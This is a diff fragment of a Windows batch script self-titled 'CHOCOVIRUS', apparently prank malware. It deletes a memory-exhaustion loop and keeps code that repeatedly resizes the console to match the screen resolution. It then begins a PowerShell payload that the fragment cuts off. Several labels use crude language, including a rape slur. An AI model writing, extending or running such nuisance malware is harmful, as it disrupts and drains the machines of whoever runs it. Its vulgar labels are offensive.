@@ -1,7 +1,6 @@
 @echo off
-title CHOCOVIRUS BATCH REWRITTEN
+
 :ResolutionFucker
-:MemoryLeak
 :ChocoFace
 :ChocolateScreen
 :DVDCursorRapist
@@ -15,19 +14,7 @@ for /F "tokens=2 delims=:" %%a in ('wmic path Win32_VideoController get CurrentH
     mode %%a,%%a
     timeout /t 1
 )
-goto MemoryLeak
-
-:MemoryLeak
-setlocal enabledelayedexpansion
-set "size=4096"
-:memoryleak_loop
-set /a size=!size! * 2
-echo Allocating memory block of size %size%...
-set "block=!block!!size:~-1!"
-if "!block!" neq "" (
-    set "block=!block:~1!"
-    set "block=!block:~-%size%!"
-)
+goto ChocoFace
 
 :ChocoFace
 powershell -command "& {Add-Type -TypeDefinition $'
